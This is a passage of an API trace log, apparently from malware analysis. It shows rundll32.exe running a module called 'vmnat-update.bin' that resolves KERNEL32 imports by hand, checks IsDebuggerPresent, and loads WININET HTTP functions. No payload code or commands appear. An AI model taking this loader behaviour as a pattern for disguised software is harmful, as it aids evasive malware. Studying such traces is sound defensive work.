+[PAR] LPCSTR  lpProcName : 0x000000018005D0DE ("Sleep")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D71E ("HeapSize")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D704 ("SetEnvironmentVariableA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6F2 ("CompareStringW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D284 ("GetCurrentThreadId")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D29A ("GetVersion")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D2A8 ("GetFileType")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D2B6 ("GetStdHandle")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D2C6 ("FlushConsoleInputBuffer")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D2E0 ("QueryPerformanceCounter")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D2FA ("GetCurrentProcessId")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D310 ("GlobalMemoryStatus")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D326 ("LoadLibraryW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D336 ("GetVersionExW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D346 ("HeapReAlloc")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D354 ("GetSystemTimeAsFileTime")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D36E ("FlsSetValue")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D37C ("GetCommandLineA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D38E ("DecodePointer")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D39E ("EncodePointer")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D3AE ("SetConsoleCtrlHandler")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D3C6 ("ReadConsoleInputA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D3DA ("SetConsoleMode")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D3EC ("GetConsoleMode")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D3FE ("TerminateProcess")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D412 ("GetCurrentProcess")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D426 ("UnhandledExceptionFilter")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D442 ("SetUnhandledExceptionFilter")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D460 ("IsDebuggerPresent")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D474 ("RtlVirtualUnwind")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D488 ("RtlLookupFunctionEntry")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4A2 ("RtlCaptureContext")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4B6 ("GetModuleHandleW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4CA ("ExitProcess")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4D8 ("WriteFile")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4E4 ("GetModuleFileNameW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D4FA ("HeapSetInformation")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D510 ("HeapCreate")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D51E ("HeapDestroy")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D52C ("RtlUnwindEx")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D53A ("GetCPInfo")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D546 ("GetACP")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D550 ("GetOEMCP")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D55C ("IsValidCodePage")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D56E ("FlsGetValue")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D57C ("FlsFree")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D586 ("SetLastError")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D596 ("FlsAlloc")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D5A2 ("GetTimeZoneInformation")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D5BC ("GetConsoleCP")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D5CC ("FlushFileBuffers")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D5E0 ("DeleteCriticalSection")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D5F8 ("SetStdHandle")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D608 ("SetHandleCount")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D61A ("GetStartupInfoW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D62C ("CreateFileA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D63A ("ReadFile")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D646 ("SetFilePointer")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D658 ("GetModuleFileNameA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D66E ("FreeEnvironmentStringsW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D688 ("GetEnvironmentStringsW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6A2 ("CreateFileW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6B0 ("LCMapStringW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6C0 ("GetStringTypeW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6D2 ("WriteConsoleW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005D6E2 ("SetEndOfFile")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BB760000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018005CF92 ("FreeLibrary")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CB9C
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d19ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000018005D128 ("USER32.dll")
+[RET] 0x7ff9aa0d1926
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000457D4B0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000457D4B0B00
+[PAR] SIZE_T Size        : 0x10
+[RET] 0x7ff9aa0e643f in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCF60000 ("USER32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D11E ("wsprintfW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCF60000 ("USER32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D774 ("MessageBoxW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCF60000 ("USER32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D72A ("GetUserObjectInformationW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCF60000 ("USER32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D746 ("GetProcessWindowStation")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCF60000 ("USER32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D760 ("GetDesktopWindow")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CBB0
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d19ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000018005D252 ("WININET.dll")
+[RET] 0x7ff9aa0d1926
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000457D4B0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000457D4B0B00
+[PAR] SIZE_T Size        : 0x18
+[RET] 0x7ff9aa0e643f in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D23E ("InternetCloseHandle")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D222 ("InternetCanonicalizeUrlW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D20E ("HttpOpenRequestW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
